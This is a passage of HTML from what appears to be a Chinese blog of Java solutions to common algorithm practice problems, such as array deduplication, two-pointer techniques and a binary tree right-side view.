</span>&#123;</span><br><span class="line">        String[] v1 = version1.split(<span class="string">"\\."</span>);</span><br><span class="line">        String[] v2 = version2.split(<span class="string">"\\."</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v1.length || i &lt; v2.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; v1.length) &#123;</span><br><span class="line">                x = Integer.parseInt(v1[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; v2.length) &#123;</span><br><span class="line">                y = Integer.parseInt(v2[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (x &gt; y) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (x &lt; y) &#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树的右视图"><a href="#二叉树的右视图" class="headerlink" title="二叉树的右视图"></a>二叉树的右视图</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">rightSideView</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>) <span class="keyword">return</span> res;</span><br><span class="line">        Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        queue.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">            <span class="comment">//当前层创建下一层，创建之后要一起添加到queue，不能直接添加到queue，因为要获取这一层最后queue最后一个node，若是不用while用for循环queue的size就不用创建nextlevel吧</span></span><br><span class="line">            Queue&lt;TreeNode&gt; nextLevel = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">            <span class="keyword">int</span> lastVal = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">                TreeNode cur = queue.poll();</span><br><span class="line">                lastVal = cur.val;</span><br><span class="line">                <span class="keyword">if</span>(cur.left != <span class="keyword">null</span>) nextLevel.offer(cur.left);</span><br><span class="line">                <span class="keyword">if</span>(cur.right != <span class="keyword">null</span>) nextLevel.offer(cur.right);</span><br><span class="line">            &#125;</span><br><span class="line">            res.add(lastVal);</span><br><span class="line">            queue.addAll(nextLevel);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="365道高频算法题"><a href="#365道高频算法题" class="headerlink" title="365道高频算法题"></a>365道高频算法题</h1><h2 id="刷题第一天"><a href="#刷题第一天" class="headerlink" title="刷题第一天"></a>刷题第一天</h2><h3 id="1-数组中重复数字"><a href="#1-数组中重复数字" class="headerlink" title="1. 数组中重复数字"></a>1. 数组中重复数字</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">findDuplicates</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> index = Math.abs(nums[i]) - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[index] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                res.add(Math.abs(nums[i]));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                nums[index] = -nums[index];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-消失的数字"><a href="#2-消失的数字" class="headerlink" title="2. 消失的数字"></a>2. 消失的数字</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">findDisappearedNumbers</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> index = (nums[i] - <span class="number">1</span>) % n;</span><br><span class="line">            nums[index] += n;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &lt;= n)&#123;</span><br><span class="line">                res.add(i+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-查找常用字符"><a href="#3-查找常用字符" class="headerlink" title="3. 查找常用字符"></a>3. 查找常用字符</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">commonChars</span><span class="params">(String[] words)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] minfreq = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">        Arrays.fill(minfreq, Integer.MAX_VALUE);</span><br><span class="line">        <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">            <span class="keyword">int</span>[] freq = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">            <span class="keyword">int</span> length = word.length();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">                <span class="keyword">char</span> ch = word.charAt(i);</span><br><span class="line">                ++freq[ch - <span class="string">'a'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) &#123;</span><br><span class="line">                minfreq[i] = Math.min(minfreq[i], freq[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; ans = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; minfreq[i]; ++j) &#123;</span><br><span class="line">                ans.add(String.valueOf((<span class="keyword">char</span>) (i + <span class="string">'a'</span>)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-上升下降字符串"><a href="#4-上升下降字符串" class="headerlink" title="4. 上升下降字符串"></a>4. 上升下降字符串</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sortString</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] num = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">26</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            num[s.charAt(i) - <span class="string">'a'</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        StringBuffer ret = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">while</span> (ret.length() &lt; s.length()) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (num[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    ret.append((<span class="keyword">char</span>) (i + <span class="string">'a'</span>));</span><br><span class="line">                    num[i]--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">25</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (num[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    ret.append((<span class="keyword">char</span>) (i + <span class="string">'a'</span>));</span><br><span class="line">                    num[i]--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-删除有序数组中的重复项"><a href="#5-删除有序数组中的重复项" class="headerlink" title="5. 删除有序数组中的重复项"></a>5. 删除有序数组中的重复项</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeDuplicates</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> slow = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> fast = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(fast &lt; nums.length)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fast] != nums[slow])&#123;</span><br><span class="line">                slow++;</span><br><span class="line">                nums[slow] = nums[fast];</span><br><span class="line">            &#125;</span><br><span class="line">            fast++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-移动零"><a href="#6-移动零" class="headerlink" title="6. 移动零"></a>6. 移动零</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">int</span> slow = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> fast = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(fast &lt; nums.length)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fast]!=<span class="number">0</span>)&#123;</span><br><span class="line">                nums[slow] = nums[fast];</span><br><span class="line">                slow++;</span><br><span class="line">            &#125; </span><br><span class="line">            fast++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = slow; i &lt; nums.length; i++)&#123;</span><br><span class="line">            nums[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-删除排序数组中的重复元素二"><a href="#7-删除排序数组中的重复元素二" class="headerlink" title="7. 删除排序数组中的重复元素二"></a>7. 删除排序数组中的重复元素二</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeDuplicates</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length &lt;= <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> nums.length;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> slow = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">int</span> fast = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span>(fast &lt; nums.length)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fast] != nums[slow -<span class="number">2</span>])&#123;</span><br><span class="line">                nums[slow] = nums[fast];</span><br><span class="line">                slow++;</span><br><span class="line">            &#125;</span><br><span class="line">            fast++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-移除元素"><a href="#8-移除元素" class="headerlink" title="8. 移除元素"></a>8. 移除元素</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.length;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> right = <span class="number">0</span>; right &lt; n; right++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[right] != val) &#123;</span><br><span class="line">                nums[left] = nums[right];</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对撞指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">removeElement</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[left] == val)&#123;</span><br><span class="line">                nums[left] = nums[right];</span><br><span class="line">                right--;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> right+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-反转字符串"><a href="#9-反转字符串" class="headerlink" title="9. 反转字符串"></a>9. 反转字符串</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reverseString</span><span class="params">(<span class="keyword">char</span>[] s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> left = <span class="number">0</span>, right = n - <span class="number">1</span>; left &lt; right; ++left, --right) &#123;</span><br><span class="line">            <span class="keyword">char</span> tmp = s[left];</span><br><span class="line">            s[left] = s[right];</span><br><span class="line">            s[right] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-盛最多水的容器"><a href="#10-盛最多水的容器" class="headerlink" title="10. 盛最多水的容器"></a>10. 盛最多水的容器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="keyword">int</span>[] height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = height.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">            <span class="keyword">int</span> area = Math.min(height[l], height[r]) * (r - l);</span><br><span class="line">            ans = Math.max(ans, area);</span><br><span class="line">            <span class="keyword">if</span> (height[l] &lt;= height[r]) &#123;</span><br><span class="line">                ++l;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                --r;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-一维数组的动态和"><a href="#11-一维数组的动态和" class="headerlink" title="11. 一维数组的动态和"></a>11. 一维数组的动态和</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] runningSum(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length == <span class="number">0</span> &amp;&amp; nums.length == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> nums;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> slow = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> fast = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span>[] ans = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        <span class="keyword">while</span>(fast &lt; nums.length)&#123;</span><br><span class="line">            <span class="keyword">if</span>(fast == <span class="number">0</span>)&#123;</span><br><span class="line">                ans[fast] = nums[fast];</span><br><span class="line">                fast++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ans[fast] = ans[slow]+nums[fast];</span><br><span class="line">                slow++;</span><br><span class="line">                fast++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-除自身以外数组的乘积"><a href="#12-除自身以外数组的乘积" class="headerlink" title="12. 除自身以外数组的乘积"></a>12. 除自身以外数组的乘积</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] productExceptSelf(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> length = nums.length;</span><br><span class="line">        <span class="keyword">int</span>[] answer = <span class="keyword">new</span> <span class="keyword">int</span>[length];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// answer[i] 表示索引 i 左侧所有元素的乘积</span></span><br><span class="line">        <span class="comment">// 因为索引为 '0' 的元素左侧没有元素， 所以 answer[0] = 1</span></span><br><span class="line">        answer[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; length; i++) &#123;</span><br><span class="line">            answer[i] = nums[i - <span class="number">1</span>] * answer[i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// R 为右侧所有元素的乘积</span></span><br><span class="line">        <span class="comment">// 刚开始右边没有元素，所以 R = 1</span></span><br><span class="line">        <span class="keyword">int</span> R = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="comment">// 对于索引 i，左边的乘积为 answer[i]，右边的乘积为 R</span></span><br><span class="line">            answer[i] = answer[i] * R;</span><br><span class="line">            <span class="comment">// R 需要包含右边所有的乘积，所以计算下一个结果时需要将当前值乘到 R 上</span></span><br><span class="line">            R *= nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> answer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="刷题第二天"><a href="#刷题第二天" class="headerlink" title="刷题第二天"></a>刷题第二天</h2><h3 id="1-有效的山脉数组"><a href="#1-有效的山脉数组" class="headerlink" title="1. 有效的山脉数组"></a>1. 有效的山脉数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">validMountainArray</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = arr.length;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; n-<span class="number">1</span> &amp;&amp;  arr[i] &lt; arr[i + <span class="number">1</span>])&#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">0</span> || i == n - <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; n-<span class="number">1</span> &amp;&amp; arr[i] &gt; arr[i+<span class="number">1</span>])&#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i == n-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span 